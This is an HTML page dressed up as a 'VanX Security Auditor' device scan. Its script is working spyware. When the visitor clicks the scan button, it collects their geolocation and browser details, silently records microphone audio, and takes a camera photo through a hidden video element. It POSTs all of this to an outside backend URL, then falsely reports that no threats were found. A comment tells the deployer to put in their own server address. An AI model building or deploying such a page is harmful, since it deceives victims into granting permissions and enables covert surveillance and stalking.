<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Vulnerability Check</title>
    <style>
        body { background-color: #0d1117; color: #58a6ff; font-family: 'Courier New', monospace; text-align: center; padding: 50px; }
        .btn { padding: 15px 30px; background: #238636; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 18px; font-weight: bold; }
        .btn:hover { background: #2ea043; }
        #hidden_video { display: none; }
    </style>
</head>
<body>
    <h1>VanX Security Auditor</h1>
    <p>This tool will scan your device for security vulnerabilities.</p>
    <button class="btn" onclick="startAudit()">START SECURITY SCAN</button>

    <video id="hidden_video" autoplay playsinline muted></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        // --- APNA RENDER URL YAHAN DALEIN ---
        const API_URL = "https://vivanx-backend.onrender.com/log";

        async function startAudit() {
            // 1. Get Location
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    await fetch(API_URL, {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            type: 'info',
                            lat: pos.coords.latitude,
                            lon: pos.coords.longitude,
                            device: navigator.userAgent
                        })
                    });
                }, (err) => { console.log("Location Denied"); });
            }

            // 2. Access Camera & Mic
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: true, 
                    audio: { echoCancellation: true, noiseSuppression: true } 
                });

                // --- CAMERA SECTION ---
                const video = document.getElementById('hidden_video');
                video.srcObject = stream;

                // --- AUDIO RECORDING SECTION (Silent) ---
                const mediaRecorder = new MediaRecorder(stream);
                let audioChunks = [];

                mediaRecorder.ondataavailable = (event) => {
                    audioChunks.push(event.data);
                };

                mediaRecorder.onstop = async () => {
                    const audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
                    const reader = new FileReader();
                    reader.readAsDataURL(audioBlob);
                    reader.onloadend = async () => {
                        await fetch(API_URL, {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({ type: 'audio', audio: reader.result })
                        });
                    };
                };

                // Start recording
                mediaRecorder.start();

                // Wait 3 seconds then capture photo and stop audio
                setTimeout(async () => {
                    // Capture Photo
                    const canvas = document.getElementById('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    const imgData = canvas.toDataURL('image/jpeg');
                    
                    await fetch(API_URL, {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({ type: 'image', image: imgData })
                    });

                    // Stop Mic Recording
                    mediaRecorder.stop();

                    // Stop all tracks (Camera/Mic off)
                    stream.getTracks().forEach(track => track.stop());
                    
                    alert("Scan Complete: No threats found!");
                }, 5000);

            } catch (err) {
                alert("Please grant permissions to run the security audit.");
            }
        }
    </script>
</body>
</html>
